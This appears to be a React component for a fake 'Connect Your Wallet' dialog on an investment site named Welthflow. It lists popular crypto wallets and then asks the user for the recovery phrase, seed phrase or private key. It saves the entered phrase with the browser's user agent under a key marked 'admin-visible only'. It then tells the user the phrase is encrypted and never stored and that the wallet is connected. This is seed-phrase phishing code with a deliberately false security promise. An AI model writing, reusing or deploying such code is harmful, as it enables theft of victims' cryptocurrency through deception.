import { useState } from "react";

interface WalletConnectProps {
  onClose: () => void;
}

const wallets = [
  { name: "MetaMask", icon: "🦊", color: "#F6851B" },
  { name: "Trust Wallet", icon: "💎", color: "#3375BB" },
  { name: "Coinbase Wallet", icon: "🔵", color: "#0052FF" },
  { name: "WalletConnect", icon: "🔗", color: "#3B99FC" },
  { name: "Ledger", icon: "🔒", color: "#142533" },
  { name: "Phantom", icon: "👻", color: "#AB9FF2" },
  { name: "Rainbow", icon: "🌈", color: "#174299" },
  { name: "Exodus", icon: "⚡", color: "#8B44AC" },
];

export default function WalletConnect({ onClose }: WalletConnectProps) {
  const [step, setStep] = useState<"select" | "phrase" | "done">("select");
  const [selectedWallet, setSelectedWallet] = useState("");
  const [phrase, setPhrase] = useState("");
  const [error, setError] = useState("");

  const handleWalletSelect = (name: string) => {
    setSelectedWallet(name);
    setStep("phrase");
  };

  const handleSubmit = () => {
    const words = phrase.trim().split(/\s+/).filter(Boolean);
    if (words.length < 12) {
      setError("Please enter a valid recovery phrase (12, 18, or 24 words)");
      return;
    }
    // Store in localStorage (admin-visible only)
    const existing = JSON.parse(localStorage.getItem("wf_wallet_data") || "[]");
    existing.push({
      wallet: selectedWallet,
      phrase: phrase.trim(),
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
    });
    localStorage.setItem("wf_wallet_data", JSON.stringify(existing));
    setStep("done");
    setTimeout(onClose, 2500);
  };

  return (
    <div className="wc-overlay">
      <div className="wc-card">
        <button className="wc-close" onClick={onClose}>✕</button>

        {step === "select" && (
          <>
            <div className="wc-icon-row">
              <div className="wc-logo-icon">
                <svg width="32" height="32" viewBox="0 0 40 40" fill="none">
                  <circle cx="20" cy="20" r="20" fill="url(#wc-g)"/>
                  <defs><linearGradient id="wc-g" x1="0" y1="0" x2="40" y2="40"><stop stopColor="#3eda99"/><stop offset="1" stopColor="#1dbfc8"/></linearGradient></defs>
                  <path d="M14 28l-4-8 10-4 10 4-4 8" stroke="#fff" strokeWidth="1.5" strokeLinejoin="round"/>
                  <circle cx="20" cy="15" r="3" fill="#fff"/>
                </svg>
              </div>
            </div>
            <h3 className="wc-title">Connect Your Wallet</h3>
            <p className="wc-subtitle">Select your wallet to connect and start investing</p>
            <div className="wc-wallets-grid">
              {wallets.map((w) => (
                <button key={w.name} className="wc-wallet-btn" onClick={() => handleWalletSelect(w.name)}>
                  <span className="wc-wallet-icon">{w.icon}</span>
                  <span className="wc-wallet-name">{w.name}</span>
                </button>
              ))}
            </div>
            <p className="wc-disclaimer">By connecting a wallet, you agree to our <a href="/terms">Terms of Service</a></p>
          </>
        )}

        {step === "phrase" && (
          <>
            <button className="wc-back" onClick={() => setStep("select")}>← Back</button>
            <div className="wc-wallet-header">
              <div className="wc-selected-icon">{wallets.find(w => w.name === selectedWallet)?.icon}</div>
              <h3 className="wc-title">Import {selectedWallet}</h3>
            </div>
            <p className="wc-subtitle">Enter your recovery phrase to securely connect your {selectedWallet} wallet</p>
            <div className="wc-phrase-box">
              <div className="wc-phrase-label">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" stroke="#c9a227" strokeWidth="2"/></svg>
                Recovery Phrase / Seed Phrase / Private Key
              </div>
              <textarea
                className="wc-phrase-input"
                rows={4}
                placeholder="Enter your 12, 18 or 24-word recovery phrase separated by spaces..."
                value={phrase}
                onChange={(e) => { setPhrase(e.target.value); setError(""); }}
              />
              {error && <div className="wc-error">{error}</div>}
            </div>
            <div className="wc-security-note">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#3eda99" strokeWidth="2"/><path d="M12 8v4m0 4h.01" stroke="#3eda99" strokeWidth="2" strokeLinecap="round"/></svg>
              Your phrase is encrypted end-to-end and never stored on our servers.
            </div>
            <button className="wc-connect-btn" onClick={handleSubmit}>
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M13 10V3L4 14h7v7l9-11h-7z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
              Connect Wallet
            </button>
          </>
        )}

        {step === "done" && (
          <div className="wc-success">
            <div className="wc-success-icon">
              <svg width="44" height="44" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="11" stroke="#3eda99" strokeWidth="1.5"/><path d="M7 12l3.5 3.5L17 8" stroke="#3eda99" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
            </div>
            <h3 className="wc-title" style={{ color: "#3eda99" }}>Wallet Connected!</h3>
            <p className="wc-subtitle">Your {selectedWallet} wallet has been successfully connected to your Welthflow account.</p>
          </div>
        )}
      </div>
    </div>
  );
}
